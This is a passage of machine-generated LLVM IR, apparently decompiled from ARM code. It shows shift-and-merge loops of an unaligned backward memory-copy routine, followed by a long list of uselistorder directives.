  %v0_181e8 = phi i32 [ %v1_181e8, %dec_label_pc_181c4.dec_label_pc_181c4_crit_edge ], [ %v0_181e831, %dec_label_pc_181bc ]
  %v0_181c8 = phi i32 [ %v0_181c8.pre, %dec_label_pc_181c4.dec_label_pc_181c4_crit_edge ], [ %v1_181a0, %dec_label_pc_181bc ]
  %v0_181c4 = phi i32 [ %v0_181c4.pre, %dec_label_pc_181c4.dec_label_pc_181c4_crit_edge ], [ %v2_181a4, %dec_label_pc_181bc ]
  %v3_181c4 = mul i32 %v0_181c4, 256
  store i32 %v3_181c4, i32* %lr.global-to-local, align 4
  %v1_181c8 = add i32 %v0_181c8, -4
  %v2_181c8 = inttoptr i32 %v1_181c8 to i32*
  %v3_181c8 = load i32, i32* %v2_181c8, align 4
  store i32 %v3_181c8, i32* %r3.global-to-local, align 4
  %v4_181c8 = add i32 %v0_181c8, -8
  %v5_181c8 = inttoptr i32 %v4_181c8 to i32*
  %v6_181c8 = load i32, i32* %v5_181c8, align 4
  store i32 %v6_181c8, i32* %r4.global-to-local, align 4
  %v7_181c8 = add i32 %v0_181c8, -12
  %v8_181c8 = inttoptr i32 %v7_181c8 to i32*
  %v9_181c8 = load i32, i32* %v8_181c8, align 4
  store i32 %v9_181c8, i32* %r5.global-to-local, align 4
  %v10_181c8 = add i32 %v0_181c8, -16
  %v11_181c8 = inttoptr i32 %v10_181c8 to i32*
  %v12_181c8 = load i32, i32* %v11_181c8, align 4
  store i32 %v10_181c8, i32* %r1.global-to-local, align 4
  %v4_181cc = udiv i32 %v12_181c8, 16777216
  %v5_181cc = or i32 %v4_181cc, %v3_181c4
  store i32 %v5_181cc, i32* %lr.global-to-local, align 4
  %v3_181d0 = mul i32 %v12_181c8, 256
  %v4_181d4 = udiv i32 %v9_181c8, 16777216
  %v5_181d4 = or i32 %v3_181d0, %v4_181d4
  store i32 %v5_181d4, i32* @ip, align 4
  %v3_181d8 = mul i32 %v9_181c8, 256
  %v4_181dc = udiv i32 %v6_181c8, 16777216
  %v5_181dc = or i32 %v3_181d8, %v4_181dc
  store i32 %v5_181dc, i32* %r5.global-to-local, align 4
  %v3_181e0 = mul i32 %v6_181c8, 256
  %v4_181e4 = udiv i32 %v3_181c8, 16777216
  %v5_181e4 = or i32 %v3_181e0, %v4_181e4
  store i32 %v5_181e4, i32* %r4.global-to-local, align 4
  %v1_181e8 = add i32 %v0_181e8, -16
  %v2_181e8 = inttoptr i32 %v1_181e8 to i32*
  store i32 %v5_181e4, i32* %v2_181e8, align 4
  %v4_181e8 = add i32 %v0_181e8, -12
  %v5_181e8 = inttoptr i32 %v4_181e8 to i32*
  %v6_181e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_181e8, i32* %v5_181e8, align 4
  %v7_181e8 = add i32 %v0_181e8, -8
  %v8_181e8 = inttoptr i32 %v7_181e8 to i32*
  %v9_181e8 = load i32, i32* @ip, align 4
  store i32 %v9_181e8, i32* %v8_181e8, align 4
  %v10_181e8 = add i32 %v0_181e8, -4
  %v11_181e8 = inttoptr i32 %v10_181e8 to i32*
  %v12_181e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_181e8, i32* %v11_181e8, align 4
  store i32 %v1_181e8, i32* %r0.global-to-local, align 4
  %v0_181ec = load i32, i32* %r2.global-to-local, align 4
  %v2_181ec = add i32 %v0_181ec, -16
  store i32 %v2_181ec, i32* %r2.global-to-local, align 4
  %v6_181f0 = icmp slt i32 %v0_181ec, 16
  br i1 %v6_181f0, label %dec_label_pc_181f4, label %dec_label_pc_181c4.dec_label_pc_181c4_crit_edge

dec_label_pc_181c4.dec_label_pc_181c4_crit_edge:  ; preds = %dec_label_pc_181c4
  %v0_181c4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_181c8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181c4

dec_label_pc_181f4:                               ; preds = %dec_label_pc_181c4
  %v2_181f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_181f4, i32* @r4, align 4
  %v5_181f4 = load i8*, i8** %stack_var_-8, align 4
  %v6_181f4 = ptrtoint i8* %v5_181f4 to i32
  store i32 %v6_181f4, i32* @r5, align 4
  store i32 %v11_181c0, i32* @lr, align 4
  %v2_181f8 = add i32 %v0_181ec, -4
  store i32 %v2_181f8, i32* %r2.global-to-local, align 4
  %v4_181f8 = add i32 %v0_181ec, 2147483632
  %v5_181f8 = and i32 %v2_181f8, %v4_181f8
  %v6_181f8 = icmp slt i32 %v5_181f8, 0
  store i1 %v6_181f8, i1* %cpsr_v.global-to-local, align 1
  %v7_181f8 = icmp slt i32 %v2_181f8, 0
  store i1 %v7_181f8, i1* %cpsr_n.global-to-local, align 1
  %v5_181fc = icmp slt i32 %v2_181ec, -12
  br i1 %v5_181fc, label %dec_label_pc_18218, label %dec_label_pc_18200

dec_label_pc_18200:                               ; preds = %dec_label_pc_181f4, %dec_label_pc_181b4, %dec_label_pc_18200
  %v1_1820c = phi i32 [ %v5_1820c, %dec_label_pc_18200 ], [ %v1_181e8, %dec_label_pc_181f4 ], [ %v0_181e831, %dec_label_pc_181b4 ]
  %v0_18200 = load i32, i32* %r3.global-to-local, align 4
  %v3_18200 = mul i32 %v0_18200, 256
  store i32 %v3_18200, i32* %ip.global-to-local, align 4
  %v0_18204 = load i32, i32* %r1.global-to-local, align 4
  %v1_18204 = add i32 %v0_18204, -4
  %v2_18204 = inttoptr i32 %v1_18204 to i32*
  %v3_18204 = load i32, i32* %v2_18204, align 4
  store i32 %v3_18204, i32* %r3.global-to-local, align 4
  store i32 %v1_18204, i32* %r1.global-to-local, align 4
  %v4_18208 = udiv i32 %v3_18204, 16777216
  %v5_18208 = or i32 %v4_18208, %v3_18200
  store i32 %v5_18208, i32* @ip, align 4
  %v2_1820c = add i32 %v1_1820c, -4
  %v3_1820c = inttoptr i32 %v2_1820c to i32*
  store i32 %v5_18208, i32* %v3_1820c, align 4
  %v4_1820c = load i32, i32* %r0.global-to-local, align 4
  %v5_1820c = add i32 %v4_1820c, -4
  store i32 %v5_1820c, i32* %r0.global-to-local, align 4
  %v0_18210 = load i32, i32* %r2.global-to-local, align 4
  %v2_18210 = add i32 %v0_18210, -4
  store i32 %v2_18210, i32* %r2.global-to-local, align 4
  %v6_18214 = icmp slt i32 %v0_18210, 4
  br i1 %v6_18214, label %dec_label_pc_18218.loopexit, label %dec_label_pc_18200

dec_label_pc_18218.loopexit:                      ; preds = %dec_label_pc_18200
  %v4_18210 = sub i32 3, %v0_18210
  %v5_18210 = and i32 %v4_18210, %v0_18210
  %v6_18210 = icmp slt i32 %v5_18210, 0
  %v7_18210 = icmp slt i32 %v2_18210, 0
  store i1 %v6_18210, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18210, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18218

dec_label_pc_18218:                               ; preds = %dec_label_pc_18218.loopexit, %dec_label_pc_181f4
  %v2_1815c63 = phi i32 [ %v5_1820c, %dec_label_pc_18218.loopexit ], [ %v1_181e8, %dec_label_pc_181f4 ]
  %v0_1814c59 = phi i32 [ %v2_18210, %dec_label_pc_18218.loopexit ], [ %v2_181f8, %dec_label_pc_181f4 ]
  %v0_18218 = load i32, i32* %r1.global-to-local, align 4
  %v1_18218 = add i32 %v0_18218, 3
  store i32 %v1_18218, i32* @r1, align 4
  br label %bb143

dec_label_pc_18220:                               ; preds = %dec_label_pc_181b0
  br i1 %v5_18290, label %dec_label_pc_1826c, label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_18220
  store i32 %v2_1828c, i32* %r2.global-to-local, align 4
  %v3_1822c = load i32, i32* @r4, align 4
  store i32 %v3_1822c, i32* %stack_var_-12, align 4
  %v6_1822c = load i32, i32* @r5, align 4
  %v8_1822c = inttoptr i32 %v6_1822c to i8*
  store i8* %v8_1822c, i8** %stack_var_-8, align 4
  %v11_1822c = load i32, i32* @lr, align 4
  br label %dec_label_pc_18230

dec_label_pc_18230:                               ; preds = %dec_label_pc_18230.dec_label_pc_18230_crit_edge, %dec_label_pc_18228
  %v0_18254 = phi i32 [ %v1_18254, %dec_label_pc_18230.dec_label_pc_18230_crit_edge ], [ %v0_181e831, %dec_label_pc_18228 ]
  %v0_18234 = phi i32 [ %v0_18234.pre, %dec_label_pc_18230.dec_label_pc_18230_crit_edge ], [ %v1_181a0, %dec_label_pc_18228 ]
  %v0_18230 = phi i32 [ %v0_18230.pre, %dec_label_pc_18230.dec_label_pc_18230_crit_edge ], [ %v2_181a4, %dec_label_pc_18228 ]
  %v3_18230 = mul i32 %v0_18230, 65536
  store i32 %v3_18230, i32* %lr.global-to-local, align 4
  %v1_18234 = add i32 %v0_18234, -4
  %v2_18234 = inttoptr i32 %v1_18234 to i32*
  %v3_18234 = load i32, i32* %v2_18234, align 4
  store i32 %v3_18234, i32* %r3.global-to-local, align 4
  %v4_18234 = add i32 %v0_18234, -8
  %v5_18234 = inttoptr i32 %v4_18234 to i32*
  %v6_18234 = load i32, i32* %v5_18234, align 4
  store i32 %v6_18234, i32* %r4.global-to-local, align 4
  %v7_18234 = add i32 %v0_18234, -12
  %v8_18234 = inttoptr i32 %v7_18234 to i32*
  %v9_18234 = load i32, i32* %v8_18234, align 4
  store i32 %v9_18234, i32* %r5.global-to-local, align 4
  %v10_18234 = add i32 %v0_18234, -16
  %v11_18234 = inttoptr i32 %v10_18234 to i32*
  %v12_18234 = load i32, i32* %v11_18234, align 4
  store i32 %v10_18234, i32* %r1.global-to-local, align 4
  %v4_18238 = udiv i32 %v12_18234, 65536
  %v5_18238 = or i32 %v4_18238, %v3_18230
  store i32 %v5_18238, i32* %lr.global-to-local, align 4
  %v3_1823c = mul i32 %v12_18234, 65536
  %v4_18240 = udiv i32 %v9_18234, 65536
  %v5_18240 = or i32 %v3_1823c, %v4_18240
  store i32 %v5_18240, i32* @ip, align 4
  %v3_18244 = mul i32 %v9_18234, 65536
  %v4_18248 = udiv i32 %v6_18234, 65536
  %v5_18248 = or i32 %v3_18244, %v4_18248
  store i32 %v5_18248, i32* %r5.global-to-local, align 4
  %v3_1824c = mul i32 %v6_18234, 65536
  %v4_18250 = udiv i32 %v3_18234, 65536
  %v5_18250 = or i32 %v3_1824c, %v4_18250
  store i32 %v5_18250, i32* %r4.global-to-local, align 4
  %v1_18254 = add i32 %v0_18254, -16
  %v2_18254 = inttoptr i32 %v1_18254 to i32*
  store i32 %v5_18250, i32* %v2_18254, align 4
  %v4_18254 = add i32 %v0_18254, -12
  %v5_18254 = inttoptr i32 %v4_18254 to i32*
  %v6_18254 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18254, i32* %v5_18254, align 4
  %v7_18254 = add i32 %v0_18254, -8
  %v8_18254 = inttoptr i32 %v7_18254 to i32*
  %v9_18254 = load i32, i32* @ip, align 4
  store i32 %v9_18254, i32* %v8_18254, align 4
  %v10_18254 = add i32 %v0_18254, -4
  %v11_18254 = inttoptr i32 %v10_18254 to i32*
  %v12_18254 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18254, i32* %v11_18254, align 4
  store i32 %v1_18254, i32* %r0.global-to-local, align 4
  %v0_18258 = load i32, i32* %r2.global-to-local, align 4
  %v2_18258 = add i32 %v0_18258, -16
  store i32 %v2_18258, i32* %r2.global-to-local, align 4
  %v6_1825c = icmp slt i32 %v0_18258, 16
  br i1 %v6_1825c, label %dec_label_pc_18260, label %dec_label_pc_18230.dec_label_pc_18230_crit_edge

dec_label_pc_18230.dec_label_pc_18230_crit_edge:  ; preds = %dec_label_pc_18230
  %v0_18230.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18234.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18230

dec_label_pc_18260:                               ; preds = %dec_label_pc_18230
  %v2_18260 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18260, i32* @r4, align 4
  %v5_18260 = load i8*, i8** %stack_var_-8, align 4
  %v6_18260 = ptrtoint i8* %v5_18260 to i32
  store i32 %v6_18260, i32* @r5, align 4
  store i32 %v11_1822c, i32* @lr, align 4
  %v2_18264 = add i32 %v0_18258, -4
  store i32 %v2_18264, i32* %r2.global-to-local, align 4
  %v4_18264 = add i32 %v0_18258, 2147483632
  %v5_18264 = and i32 %v2_18264, %v4_18264
  %v6_18264 = icmp slt i32 %v5_18264, 0
  store i1 %v6_18264, i1* %cpsr_v.global-to-local, align 1
  %v7_18264 = icmp slt i32 %v2_18264, 0
  store i1 %v7_18264, i1* %cpsr_n.global-to-local, align 1
  %v5_18268 = icmp slt i32 %v2_18258, -12
  br i1 %v5_18268, label %dec_label_pc_18284, label %dec_label_pc_1826c

dec_label_pc_1826c:                               ; preds = %dec_label_pc_18260, %dec_label_pc_18220, %dec_label_pc_1826c
  %v1_18278 = phi i32 [ %v5_18278, %dec_label_pc_1826c ], [ %v1_18254, %dec_label_pc_18260 ], [ %v0_181e831, %dec_label_pc_18220 ]
  %v0_1826c = load i32, i32* %r3.global-to-local, align 4
  %v3_1826c = mul i32 %v0_1826c, 65536
  store i32 %v3_1826c, i32* %ip.global-to-local, align 4
  %v0_18270 = load i32, i32* %r1.global-to-local, align 4
  %v1_18270 = add i32 %v0_18270, -4
  %v2_18270 = inttoptr i32 %v1_18270 to i32*
  %v3_18270 = load i32, i32* %v2_18270, align 4
  store i32 %v3_18270, i32* %r3.global-to-local, align 4
  store i32 %v1_18270, i32* %r1.global-to-local, align 4
  %v4_18274 = udiv i32 %v3_18270, 65536
  %v5_18274 = or i32 %v4_18274, %v3_1826c
  store i32 %v5_18274, i32* @ip, align 4
  %v2_18278 = add i32 %v1_18278, -4
  %v3_18278 = inttoptr i32 %v2_18278 to i32*
  store i32 %v5_18274, i32* %v3_18278, align 4
  %v4_18278 = load i32, i32* %r0.global-to-local, align 4
  %v5_18278 = add i32 %v4_18278, -4
  store i32 %v5_18278, i32* %r0.global-to-local, align 4
  %v0_1827c = load i32, i32* %r2.global-to-local, align 4
  %v2_1827c = add i32 %v0_1827c, -4
  store i32 %v2_1827c, i32* %r2.global-to-local, align 4
  %v6_18280 = icmp slt i32 %v0_1827c, 4
  br i1 %v6_18280, label %dec_label_pc_18284.loopexit, label %dec_label_pc_1826c

dec_label_pc_18284.loopexit:                      ; preds = %dec_label_pc_1826c
  %v4_1827c = sub i32 3, %v0_1827c
  %v5_1827c = and i32 %v4_1827c, %v0_1827c
  %v6_1827c = icmp slt i32 %v5_1827c, 0
  %v7_1827c = icmp slt i32 %v2_1827c, 0
  store i1 %v6_1827c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1827c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18284

dec_label_pc_18284:                               ; preds = %dec_label_pc_18284.loopexit, %dec_label_pc_18260
  %v2_1815c64 = phi i32 [ %v5_18278, %dec_label_pc_18284.loopexit ], [ %v1_18254, %dec_label_pc_18260 ]
  %v0_1814c60 = phi i32 [ %v2_1827c, %dec_label_pc_18284.loopexit ], [ %v2_18264, %dec_label_pc_18260 ]
  %v0_18284 = load i32, i32* %r1.global-to-local, align 4
  %v1_18284 = add i32 %v0_18284, 2
  store i32 %v1_18284, i32* @r1, align 4
  br label %bb143

dec_label_pc_1828c:                               ; preds = %dec_label_pc_181a0
  br i1 %v5_18290, label %dec_label_pc_182d8, label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %dec_label_pc_1828c
  store i32 %v2_1828c, i32* %r2.global-to-local, align 4
  %v3_18298 = load i32, i32* @r4, align 4
  store i32 %v3_18298, i32* %stack_var_-12, align 4
  %v6_18298 = load i32, i32* @r5, align 4
  %v8_18298 = inttoptr i32 %v6_18298 to i8*
  store i8* %v8_18298, i8** %stack_var_-8, align 4
  %v11_18298 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1829c

dec_label_pc_1829c:                               ; preds = %dec_label_pc_1829c.dec_label_pc_1829c_crit_edge, %dec_label_pc_18294
  %v0_182c0 = phi i32 [ %v1_182c0, %dec_label_pc_1829c.dec_label_pc_1829c_crit_edge ], [ %v0_181e831, %dec_label_pc_18294 ]
  %v0_182a0 = phi i32 [ %v0_182a0.pre, %dec_label_pc_1829c.dec_label_pc_1829c_crit_edge ], [ %v1_181a0, %dec_label_pc_18294 ]
  %v0_1829c = phi i32 [ %v0_1829c.pre, %dec_label_pc_1829c.dec_label_pc_1829c_crit_edge ], [ %v2_181a4, %dec_label_pc_18294 ]
  %v3_1829c = mul i32 %v0_1829c, 16777216
  store i32 %v3_1829c, i32* %lr.global-to-local, align 4
  %v1_182a0 = add i32 %v0_182a0, -4
  %v2_182a0 = inttoptr i32 %v1_182a0 to i32*
  %v3_182a0 = load i32, i32* %v2_182a0, align 4
  store i32 %v3_182a0, i32* %r3.global-to-local, align 4
  %v4_182a0 = add i32 %v0_182a0, -8
  %v5_182a0 = inttoptr i32 %v4_182a0 to i32*
  %v6_182a0 = load i32, i32* %v5_182a0, align 4
  store i32 %v6_182a0, i32* %r4.global-to-local, align 4
  %v7_182a0 = add i32 %v0_182a0, -12
  %v8_182a0 = inttoptr i32 %v7_182a0 to i32*
  %v9_182a0 = load i32, i32* %v8_182a0, align 4
  store i32 %v9_182a0, i32* %r5.global-to-local, align 4
  %v10_182a0 = add i32 %v0_182a0, -16
  %v11_182a0 = inttoptr i32 %v10_182a0 to i32*
  %v12_182a0 = load i32, i32* %v11_182a0, align 4
  store i32 %v10_182a0, i32* %r1.global-to-local, align 4
  %v4_182a4 = udiv i32 %v12_182a0, 256
  %v5_182a4 = or i32 %v4_182a4, %v3_1829c
  store i32 %v5_182a4, i32* %lr.global-to-local, align 4
  %v3_182a8 = mul i32 %v12_182a0, 16777216
  %v4_182ac = udiv i32 %v9_182a0, 256
  %v5_182ac = or i32 %v3_182a8, %v4_182ac
  store i32 %v5_182ac, i32* @ip, align 4
  %v3_182b0 = mul i32 %v9_182a0, 16777216
  %v4_182b4 = udiv i32 %v6_182a0, 256
  %v5_182b4 = or i32 %v3_182b0, %v4_182b4
  store i32 %v5_182b4, i32* %r5.global-to-local, align 4
  %v3_182b8 = mul i32 %v6_182a0, 16777216
  %v4_182bc = udiv i32 %v3_182a0, 256
  %v5_182bc = or i32 %v3_182b8, %v4_182bc
  store i32 %v5_182bc, i32* %r4.global-to-local, align 4
  %v1_182c0 = add i32 %v0_182c0, -16
  %v2_182c0 = inttoptr i32 %v1_182c0 to i32*
  store i32 %v5_182bc, i32* %v2_182c0, align 4
  %v4_182c0 = add i32 %v0_182c0, -12
  %v5_182c0 = inttoptr i32 %v4_182c0 to i32*
  %v6_182c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_182c0, i32* %v5_182c0, align 4
  %v7_182c0 = add i32 %v0_182c0, -8
  %v8_182c0 = inttoptr i32 %v7_182c0 to i32*
  %v9_182c0 = load i32, i32* @ip, align 4
  store i32 %v9_182c0, i32* %v8_182c0, align 4
  %v10_182c0 = add i32 %v0_182c0, -4
  %v11_182c0 = inttoptr i32 %v10_182c0 to i32*
  %v12_182c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182c0, i32* %v11_182c0, align 4
  store i32 %v1_182c0, i32* %r0.global-to-local, align 4
  %v0_182c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_182c4 = add i32 %v0_182c4, -16
  store i32 %v2_182c4, i32* %r2.global-to-local, align 4
  %v6_182c8 = icmp slt i32 %v0_182c4, 16
  br i1 %v6_182c8, label %dec_label_pc_182cc, label %dec_label_pc_1829c.dec_label_pc_1829c_crit_edge

dec_label_pc_1829c.dec_label_pc_1829c_crit_edge:  ; preds = %dec_label_pc_1829c
  %v0_1829c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_182a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1829c

dec_label_pc_182cc:                               ; preds = %dec_label_pc_1829c
  %v2_182cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_182cc, i32* @r4, align 4
  %v5_182cc = load i8*, i8** %stack_var_-8, align 4
  %v6_182cc = ptrtoint i8* %v5_182cc to i32
  store i32 %v6_182cc, i32* @r5, align 4
  store i32 %v11_18298, i32* @lr, align 4
  %v2_182d0 = add i32 %v0_182c4, -4
  store i32 %v2_182d0, i32* %r2.global-to-local, align 4
  %v4_182d0 = add i32 %v0_182c4, 2147483632
  %v5_182d0 = and i32 %v2_182d0, %v4_182d0
  %v6_182d0 = icmp slt i32 %v5_182d0, 0
  store i1 %v6_182d0, i1* %cpsr_v.global-to-local, align 1
  %v7_182d0 = icmp slt i32 %v2_182d0, 0
  store i1 %v7_182d0, i1* %cpsr_n.global-to-local, align 1
  %v5_182d4 = icmp slt i32 %v2_182c4, -12
  br i1 %v5_182d4, label %dec_label_pc_182f0, label %dec_label_pc_182d8

dec_label_pc_182d8:                               ; preds = %dec_label_pc_182cc, %dec_label_pc_1828c, %dec_label_pc_182d8
  %v1_182e4 = phi i32 [ %v5_182e4, %dec_label_pc_182d8 ], [ %v1_182c0, %dec_label_pc_182cc ], [ %v0_181e831, %dec_label_pc_1828c ]
  %v0_182d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_182d8 = mul i32 %v0_182d8, 16777216
  store i32 %v3_182d8, i32* %ip.global-to-local, align 4
  %v0_182dc = load i32, i32* %r1.global-to-local, align 4
  %v1_182dc = add i32 %v0_182dc, -4
  %v2_182dc = inttoptr i32 %v1_182dc to i32*
  %v3_182dc = load i32, i32* %v2_182dc, align 4
  store i32 %v3_182dc, i32* %r3.global-to-local, align 4
  store i32 %v1_182dc, i32* %r1.global-to-local, align 4
  %v4_182e0 = udiv i32 %v3_182dc, 256
  %v5_182e0 = or i32 %v4_182e0, %v3_182d8
  store i32 %v5_182e0, i32* @ip, align 4
  %v2_182e4 = add i32 %v1_182e4, -4
  %v3_182e4 = inttoptr i32 %v2_182e4 to i32*
  store i32 %v5_182e0, i32* %v3_182e4, align 4
  %v4_182e4 = load i32, i32* %r0.global-to-local, align 4
  %v5_182e4 = add i32 %v4_182e4, -4
  store i32 %v5_182e4, i32* %r0.global-to-local, align 4
  %v0_182e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_182e8 = add i32 %v0_182e8, -4
  store i32 %v2_182e8, i32* %r2.global-to-local, align 4
  %v6_182ec = icmp slt i32 %v0_182e8, 4
  br i1 %v6_182ec, label %dec_label_pc_182f0.loopexit, label %dec_label_pc_182d8

dec_label_pc_182f0.loopexit:                      ; preds = %dec_label_pc_182d8
  %v4_182e8 = sub i32 3, %v0_182e8
  %v5_182e8 = and i32 %v4_182e8, %v0_182e8
  %v6_182e8 = icmp slt i32 %v5_182e8, 0
  %v7_182e8 = icmp slt i32 %v2_182e8, 0
  store i1 %v6_182e8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_182e8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_182f0

dec_label_pc_182f0:                               ; preds = %dec_label_pc_182f0.loopexit, %dec_label_pc_182cc
  %v2_1815c65 = phi i32 [ %v5_182e4, %dec_label_pc_182f0.loopexit ], [ %v1_182c0, %dec_label_pc_182cc ]
  %v0_1814c61 = phi i32 [ %v2_182e8, %dec_label_pc_182f0.loopexit ], [ %v2_182d0, %dec_label_pc_182cc ]
  %v0_182f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_182f0 = add i32 %v0_182f0, 1
  store i32 %v1_182f0, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_182e4, { 0, 2, 1 }
  uselistorder i32 %v3_182d8, { 1, 0 }
  uselistorder i32 %v2_182d0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_182c0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_182a0, { 1, 0 }
  uselistorder i32 %v3_1829c, { 1, 0 }
  uselistorder i32 %v0_182a0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_182c0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18278, { 0, 2, 1 }
  uselistorder i32 %v3_1826c, { 1, 0 }
  uselistorder i32 %v2_18264, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18254, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18234, { 1, 0 }
  uselistorder i32 %v3_18230, { 1, 0 }
  uselistorder i32 %v0_18234, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18254, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1820c, { 0, 2, 1 }
  uselistorder i32 %v3_18200, { 1, 0 }
  uselistorder i32 %v2_181f8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_181e8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_181c8, { 1, 0 }
  uselistorder i32 %v3_181c4, { 1, 0 }
  uselistorder i32 %v0_181c8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_181e8, { 3, 2, 1, 0 }
  uselistorder i1 %v5_18290, { 2, 0, 1 }
  uselistorder i32 %v0_181a8, { 1, 0 }
  uselistorder i32 %v0_18294, { 3, 0, 2, 1 }
  uselistorder i32 %v0_181e831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18198, { 2, 1, 0 }
  uselistorder i32 %v0_18198, { 2, 0, 1 }
  uselistorder i32 %v2_18190, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18190, { 1, 0, 2 }
  uselistorder i32 %v0_18190, { 2, 0, 1, 3 }
  uselistorder i32 %v0_181e832, { 2, 1, 0 }
  uselistorder i32 %v11_1816c, { 1, 0 }
  uselistorder i32 %v7_1816c, { 1, 0 }
  uselistorder i32 %v1_1814c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1814c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18150, { 1, 0 }
  uselistorder i32 %v7_18144, { 0, 2, 1 }
  uselistorder i32 %v10_18140, { 1, 0 }
  uselistorder i32 %v9_18138, { 1, 0, 2 }
  uselistorder i32 %v6_18134, { 1, 0 }
  uselistorder i32 %v2_1812c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1812c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1813c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18120, { 0, 2, 1 }
  uselistorder i32 %v13_1811c, { 1, 0 }
  uselistorder i32 %v4_18118, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18118, { 2, 0, 1 }
  uselistorder i32 %v6_18120, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18110, { 0, 2, 1 }
  uselistorder i32 %v16_1810c, { 1, 0 }
  uselistorder i32 %v4_18108, { 1, 0 }
  uselistorder i32 %v0_18118.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18110, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_180fc, { 0, 3, 2, 1 }
  uselistorder i32 %v10_180f8, { 1, 0 }
  uselistorder i32 %v1_180f4, { 1, 0 }
  uselistorder i32 %v10_180f0, { 1, 0 }
  uselistorder i32 %v0_180f0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_180f4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_180e8, { 0, 2, 1 }
  uselistorder i32 %v2_180dc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_180dc, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_180f449, { 1, 2, 0 }
  uselistorder i32 %v1_180d4, { 2, 1, 0 }
  uselistorder i32 %v1_180cc, { 2, 3, 1, 0 }
  uselistorder i32 %v2_180c4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_180c0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_180bc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_180bc, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_180a8, { 0, 2, 1 }
  uselistorder i32 %v3_1809c, { 1, 0 }
  uselistorder i32 %v2_18094, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18084, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18064, { 1, 0, 2 }
  uselistorder i32 %v5_18064, { 1, 0, 2 }
  uselistorder i32 %v2_18064, { 1, 0, 2 }
  uselistorder i32 %v3_18060, { 1, 0 }
  uselistorder i32 %v0_18064, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18084, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1803c, { 0, 2, 1 }
  uselistorder i32 %v3_18030, { 1, 0 }
  uselistorder i32 %v2_18028, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18018, { 1, 0, 3, 2 }
  uselistorder i32 %v8_17ff8, { 1, 0, 2 }
  uselistorder i32 %v5_17ff8, { 1, 0, 2 }
  uselistorder i32 %v2_17ff8, { 1, 0, 2 }
  uselistorder i32 %v3_17ff4, { 1, 0 }
  uselistorder i32 %v0_17ff8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18018, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_17fd0, { 0, 2, 1 }
  uselistorder i32 %v3_17fc4, { 1, 0 }
  uselistorder i32 %v2_17fbc, { 0, 2, 1, 3 }
  uselistorder i32 %v12_17fac, { 1, 0, 3, 2 }
  uselistorder i32 %v8_17f8c, { 1, 0, 2 }
  uselistorder i32 %v5_17f8c, { 1, 0, 2 }
  uselistorder i32 %v2_17f8c, { 1, 0, 2 }
  uselistorder i32 %v3_17f88, { 1, 0 }
  uselistorder i32 %v0_17f8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17fac, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_18054, { 2, 0, 1 }
  uselistorder i32 %v0_18058, { 3, 0, 2, 1 }
